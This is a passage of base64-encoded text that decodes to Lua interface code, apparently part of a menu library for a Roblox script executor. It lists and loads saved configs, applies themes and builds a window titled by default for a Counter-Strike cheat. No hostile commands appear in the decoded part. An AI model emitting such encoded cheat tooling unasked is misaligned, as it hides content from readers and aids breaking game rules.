gICAgICAgICAKICAgICAgICAgICAgZm9yIGlkeCwgZmlsZSBpbiBsaXN0ZmlsZXMobGlicmFyeS5kaXJlY3RvcnkgLi4gIi9jb25maWdzIikgZG8KICAgICAgICAgICAgICAgIGxvY2FsIG5hbWUgPSBmaWxlOmdzdWIobGlicmFyeS5kaXJlY3RvcnkgLi4gIi9jb25maWdzXFwiLCAiIik6Z3N1YigiLmNmZyIsICIiKTpnc3ViKGxpYnJhcnkuZGlyZWN0b3J5IC4uICJcXGNvbmZpZ3NcXCIsICIiKQogICAgICAgICAgICAgICAgbGlzdFsjbGlzdCArIDFdID0gbmFtZQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGNvbmZpZ19ob2xkZXIucmVmcmVzaF9vcHRpb25zKGxpc3QpCiAgICAgICAgZW5kIAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmdldF9jb25maWcoKQogICAgICAgICAgICBsb2NhbCBDb25maWcgPSB7fQogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIF8sIHYgaW4gbmV4dCwgZmxhZ3MgZG8KICAgICAgICAgICAgICAgIGlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdi5rZXkgdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZ1tfXSA9IHthY3RpdmUgPSB2LmFjdGl2ZSwgbW9kZSA9IHYubW9kZSwga2V5ID0gdG9zdHJpbmcodi5rZXkpfQogICAgICAgICAgICAgICAgZWxzZWlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdlsiVHJhbnNwYXJlbmN5Il0gYW5kIHZbIkNvbG9yIl0gdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZ1tfXSA9IHtUcmFuc3BhcmVuY3kgPSB2WyJUcmFuc3BhcmVuY3kiXSwgQ29sb3IgPSB2WyJDb2xvciJdOlRvSGV4KCl9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnW19dID0gdgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBodHRwX3NlcnZpY2U6SlNPTkVuY29kZShDb25maWcpCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6bG9hZF9jb25maWcoY29uZmlnX2pzb24pIAogICAgICAgICAgICBsb2NhbCBjb25maWcgPSBodHRwX3NlcnZpY2U6SlNPTkRlY29kZShjb25maWdfanNvbikKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBfLCB2IGluIGNvbmZpZyBkbyAKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uX3NldCA9IGxpYnJhcnkuY29uZmlnX2ZsYWdzW19dCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIF8gPT0gImNvbmZpZ19uYW1lX2xpc3QiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgY29udGludWUgCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBmdW5jdGlvbl9zZXQgdGhlbiAKICAgICAgICAgICAgICAgICAgICBpZiB0eXBlKHYpID09ICJ0YWJsZSIgYW5kIHZbIlRyYW5zcGFyZW5jeSJdIGFuZCB2WyJDb2xvciJdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb25fc2V0KGhleCh2WyJDb2xvciJdKSwgdlsiVHJhbnNwYXJlbmN5Il0pCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdlsiYWN0aXZlIl0gdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb25fc2V0KHYpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbl9zZXQodikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgZW5kIAogICAgICAgIGVuZCAKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnJvdW5kKG51bWJlciwgZmxvYXQpIAogICAgICAgICAgICBsb2NhbCBtdWx0aXBsaWVyID0gMSAvIChmbG9hdCBvciAxKQoKICAgICAgICAgICAgcmV0dXJuIGZsb29yKG51bWJlciAqIG11bHRpcGxpZXIgKyAwLjUpIC8gbXVsdGlwbGllcgogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTphcHBseV90aGVtZShpbnN0YW5jZSwgdGhlbWUsIHByb3BlcnR5KSAKICAgICAgICAgICAgaW5zZXJ0KHRoZW1lcy51dGlsaXR5W3RoZW1lXVtwcm9wZXJ0eV0sIGluc3RhbmNlKQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnVwZGF0ZV90aGVtZSh0aGVtZSwgY29sb3IpCiAgICAgICAgICAgIGZvciBfLCBwcm9wZXJ0eSBpbiB0aGVtZXMudXRpbGl0eVt0aGVtZV0gZG8gCgogICAgICAgICAgICAgICAgZm9yIG0sIG9iamVjdCBpbiBwcm9wZXJ0eSBkbyAKICAgICAgICAgICAgICAgICAgICBpZiBvYmplY3RbX10gPT0gdGhlbWVzLnByZXNldFt0aGVtZV0gdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgb2JqZWN0W19dID0gY29sb3IgCiAgICAgICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICB0aGVtZXMucHJlc2V0W3RoZW1lXSA9IGNvbG9yIAogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb25uZWN0aW9uKHNpZ25hbCwgY2FsbGJhY2spCiAgICAgICAgICAgIGxvY2FsIGNvbm5lY3Rpb24gPSBzaWduYWw6Q29ubmVjdChjYWxsYmFjaykKICAgICAgICAgICAgCiAgICAgICAgICAgIGluc2VydChsaWJyYXJ5LmNvbm5lY3Rpb25zLCBjb25uZWN0aW9uKQoKICAgICAgICAgICAgcmV0dXJuIGNvbm5lY3Rpb24gCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6Y2xvc2VfZWxlbWVudChuZXdfcGF0aCkgCiAgICAgICAgICAgIGxvY2FsIG9wZW5fZWxlbWVudCA9IGxpYnJhcnkuY3VycmVudF9vcGVuCgogICAgICAgICAgICBpZiBvcGVuX2VsZW1lbnQgYW5kIG5ld19wYXRoIH49IG9wZW5fZWxlbWVudCB0aGVuCiAgICAgICAgICAgICAgICBvcGVuX2VsZW1lbnQuc2V0X3Zpc2libGUoZmFsc2UpCiAgICAgICAgICAgICAgICBvcGVuX2VsZW1lbnQub3BlbiA9IGZhbHNlOwogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBpZiBuZXdfcGF0aCB+PSBvcGVuX2VsZW1lbnQgdGhlbiAKICAgICAgICAgICAgICAgIGxpYnJhcnkuY3VycmVudF9vcGVuID0gbmV3X3BhdGggb3IgbmlsOwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6Y3JlYXRlKGluc3RhbmNlLCBvcHRpb25zKQogICAgICAgICAgICBsb2NhbCBpbnMgPSBJbnN0YW5jZS5uZXcoaW5zdGFuY2UpIAogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIHByb3AsIHZhbHVlIGluIG9wdGlvbnMgZG8gCiAgICAgICAgICAgICAgICBpbnNbcHJvcF0gPSB2YWx1ZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBpbnMgCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6dW5sb2FkX21lbnUoKSAKICAgICAgICAgICAgaWYgbGlicmFyeVsgIml0ZW1zIiBdIHRoZW4gCiAgICAgICAgICAgICAgICBsaWJyYXJ5WyAiaXRlbXMiIF06RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgbGlicmFyeVsgIm90aGVyIiBdIHRoZW4gCiAgICAgICAgICAgICAgICBsaWJyYXJ5WyAib3RoZXIiIF06RGVzdHJveSgpCiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBpbmRleCwgY29ubmVjdGlvbiBpbiBsaWJyYXJ5LmNvbm5lY3Rpb25zIGRvIAogICAgICAgICAgICAgICAgY29ubmVjdGlvbjpEaXNjb25uZWN0KCkgCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uID0gbmlsIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxpYnJhcnkgPSBuaWwgCiAgICAgICAgZW5kIAogICAgLS0KICAgIAogICAgLS0gTGlicmFyeSBlbGVtZW50IGZ1bmN0aW9ucwogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6d2luZG93KHByb3BlcnRpZXMpCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsgCiAgICAgICAgICAgICAgICBzdWZmaXggPSBwcm9wZXJ0aWVzLnN1ZmZpeCBvciBwcm9wZXJ0aWVzLlN1ZmZpeCBvciAidGVjaCI7CiAgICAgICAgICAgICAgICBuYW1lID0gcHJvcGVydGllcy5uYW1lIG9yIHByb3BlcnRpZXMuTmFtZSBvciAibmVidWxhIjsKICAgICAgICAgICAgICAgIGdhbWVfbmFtZSA9IHByb3BlcnRpZXMuZ2FtZUluZm8gb3IgcHJvcGVydGllcy5nYW1lX2luZm8gb3IgcHJvcGVydGllcy5HYW1lSW5mbyBvciAiTWlsZW5pdW0gZm9yIENvdW50ZXItU3RyaWtlOiBHbG9iYWwgT2ZmZW5zaXZlIjsKICAgICAgICAgICAgICAgIHNpemUgPSBwcm9wZXJ0aWVzLnNpemUgb3IgcHJvcGVydGllcy5TaXplIG9yIGRpbTIoMCwgNzAwLCAwLCA1NjUpOwogICAgICAgICAgICAgICAgc2VsZWN0ZWRfdGFiOwogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKCiAgICAgICAgICAgICAgICB0d2VlbjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgbGlicmFyeVsgIml0ZW1zIiBdID0gbGlicmFyeTpjcmVhdGUoICJTY3JlZW5HdWkiICwgewogICAgICAgICAgICAgICAgUGFyZW50ID0gY29yZWd1aTsKICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgRW5hYmxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBaSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuR2xvYmFsOwogICAgICAgICAgICAgICAgSWdub3JlR3VpSW5zZXQgPSB0cnVlOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGxpYnJhcnlbICJvdGhlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiU2NyZWVuR3VpIiAsIHsKICAgICAgICAgICAgICAgIFBhcmVudCA9IGNvcmVndWk7CiAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgIEVuYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgIFpJbmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nOwogICAgICAgICAgICAgICAgSWdub3JlR3VpSW5zZXQgPSB0cnVlOwogICAgICAgICAgICB9KTsgCgogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8KICAgICAgICAgICAgICAgIGl0ZW1zWyAibWFpbiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnlbICJpdGVtcyIgXTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gY2ZnLnNpemU7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAuNSwgLWNmZy5zaXplLlguT2Zmc2V0IC8gMiwgMC41LCAtY2ZnLnNpemUuWS5PZmZzZXQgLyAyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDE0LCAxNCwgMTYpCiAgICAgICAgICAgICAgICB9KTsgaXRlbXNbICJtYWluIiBdLlBvc2l0aW9uID0gZGltMigwLCBpdGVtc1sgIm1haW4iIF0uQWJzb2x1dGVQb3NpdGlvbi5YLCAwLCBpdGVtc1sgIm1haW4iIF0uQWJzb2x1dGVQb3NpdGlvbi5ZKQoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTY2FsZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtYWluIiBdOwogICAgICAgICAgICAgICAgICAgIFNjYWxlID0gc2NhbGU7CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDEwKQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDIzLCAyMywgMjkpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibWFpbiIgXTsKICAgICAgICAgICAgICAgICAgICBBcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInNpZGVfZnJhbWUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDE5NiwgMSwgLTI1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMTQsIDE0LCAxNikKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzaWRlX2ZyYW1lIiBdOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMSwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIxLCAyMSwgMjMpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJidXR0b25faG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzaWRlX2ZyYW1lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCAwLCA2MCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIC02MCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgY2ZnLmJ1dHRvbl9ob2xkZXIgPSBpdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDE2KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDM2KTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDExKTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCAxMCkKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGxvY2FsIGFjY2VudCA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICBpdGVtc1sgInRpdGxlIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IG5hbWU7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzaWRlX2ZyYW1lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSBzdHJpbmcuZm9ybWF0KCc8dT4lczwvdT48Zm9udCBjb2xvciA9ICJyZ2IoMjU1LCAyNTUsIDI1NSkiPiVzPC9mb250PicsIGNmZy5uYW1lLCBjZmcuc3VmZml4KTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCA3MCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50OwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgUmljaFRleHQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMzA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7IGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJ0aXRsZSIgXSwgImFjY2VudCIsICJUZXh0Q29sb3IzIik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAibXVsdGlfaG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtYWluIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxOTYsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTk2LCAwLCA1Nik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgY2ZnLm11bHRpX2hvbGRlciA9IGl0ZW1zWyAibXVsdGlfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtdWx0aV9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjEsIDIxLCAyMykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInNoYWRvdyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiSW1hZ2VMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgSW1hZ2VDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2NhbGVUeXBlID0gRW51bS5TY2FsZVR5cGUuU2xpY2U7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtYWluIiBdOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDc1LCAxLCA3NSk7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAuNSwgMC41KTsKICAgICAgICAgICAgICAgICAgICBJbWFnZSA9ICJyYnhhc3NldGlkOi8vMTEyOTcxMTY3OTk5MDYyIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMC41LCAwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgIFNsaWNlU2NhbGUgPSAwLjc1OwogICAgICAgICAgICAgICAgICAgIFpJbmRleCA9IC0xMDA7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBTbGljZUNlbnRlciA9IHJlY3QodmVjMigxMTIsIDExMiksIHZlYzIoMTQ3LCAxNDcpKQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiZ2xvYmFsX2ZhZGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDE5NiwgMCwgNTYpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTk2LCAxLCAtODEpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigxNCwgMTQsIDE2KTsKICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAyOwogICAgICAgICAgICAgICAgfSk7ICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2hhZG93IiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5mbyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAyNSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIzLCAyMywgMjUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmZvIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCAxMCkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImdyZXlfZmlsbCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5mbyIgXTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgNik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIzLCAyMywgMjUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJnYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImluZm8iIF07CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDczKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5nYW1lX25hbWU7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgI